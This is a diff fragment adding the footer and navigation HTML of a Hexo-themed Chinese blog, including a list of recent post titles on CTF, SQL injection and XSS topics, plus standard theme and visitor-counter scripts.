+            <a href="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/" title="下一篇: sqli-labs-通关writeup 1-10">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/25/Bilibili-CTF1024-%E5%B9%B2%E6%9D%AF/">Bilibili CTF1024 干杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/19/Git%E6%B3%84%E9%9C%B2/">Git泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/XSS%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/">XSS测试备忘录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/">sqli-labs-通关writeup 1-10</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/26/CTF%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/">CTF入门指北</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2020 逆时针向
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+            
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
